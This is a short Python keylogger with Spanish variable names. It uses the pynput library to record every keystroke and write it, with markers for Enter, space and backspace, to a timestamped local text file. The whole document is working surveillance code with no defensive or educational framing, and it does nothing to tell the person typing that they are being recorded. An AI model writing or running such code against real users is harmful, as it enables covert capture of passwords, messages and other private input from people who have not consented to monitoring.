import datetime
from pynput.keyboard import Listener
from io import open

Fecha_hoy = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

milista = []

def RecibirDatos(key):
	fichero = open(f"informacion_{Fecha_hoy}.txt", "w")
	key = str(key)

	milista.append(key)

	for i in milista:
		if i == "Key.enter":
			fichero.write("\n")
		elif i == "Key.space":
			fichero.write(" ")
		elif i == "Key.backspace":
			fichero.write(" %BORRAR% ")
		else:
			fichero.write(i.replace("'", ""))
			
with Listener(on_press=RecibirDatos) as l:
	l.join()